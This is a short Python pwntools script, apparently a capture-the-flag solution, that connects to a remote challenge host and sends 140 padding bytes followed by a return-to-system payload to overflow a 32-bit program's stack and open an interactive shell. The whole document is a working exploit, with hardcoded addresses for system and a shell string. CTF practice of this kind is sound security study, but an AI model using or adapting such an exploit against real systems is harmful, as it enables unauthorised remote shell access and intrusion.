from  pwn import *
sh = remote('node5.buuoj.cn', 26735)
addr1= 0x08048320 #system
addr2= 0x0804A024 #bin/bash
sh.sendline(b'I'*140+p32(addr1)+p32(0)+p32(addr2))
sh.interactive()